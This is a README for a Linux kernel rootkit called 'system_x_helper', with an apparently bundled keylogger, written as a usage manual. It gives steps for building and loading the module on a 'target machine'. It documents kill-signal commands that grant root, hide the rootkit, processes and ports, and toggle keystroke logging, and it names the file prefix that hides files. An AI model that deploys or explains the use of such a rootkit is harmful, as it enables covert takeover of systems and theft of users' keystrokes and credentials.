# My very own rootkit!
Most code copied from [The Xcellerator](https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques)

Keylogger from [jarun](https://github.com/jarun/spy)

The rootkit's name is `system_x_helper`

---

## How to install

Install `dependencies` on the target machine

#### Debian
`$ apt install make build-essential linux-headers-$(uname -r)`
#### RedHat
`$ yum install kernel-devel make gcc`



Now run `$ make`

Finaly, run `$ /sbin/insmod system_x_helper.ko`

---

## Functionality
- Uses `kill` to run different things
- Gives root access
- Hide files/directories
- Hide processes
- Hide open ports/active connections
- Hide itself
- Keylogger (log: `/sys/kernel/debug/system_x_kisni/system_x_keys`)

---

## Kill flags for each functionality

#### Root backdoor
`$ kill -64 9843`
> 9843 can be any number

#### Toggle hide/unhide self (Hidden by default)
`$ kill -63 9489`
> 9489 can be any number

#### Toggle hide specified process (Can hide up to 16)
`$ kill -62 <PID to hide/unhide>`

#### Hide ports
`$ kill -61 <port number to hide>`

#### Toggle keylogger
`$ kill -60 9028`
> 9028 can be any number

---

## Hidden files/directories

#### Prefix
`system_x_`
> hides the file/directory

---

# LISCENSE
BSD 2-Clause License

Copyright (c) 2023, Kaicheng Ye

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

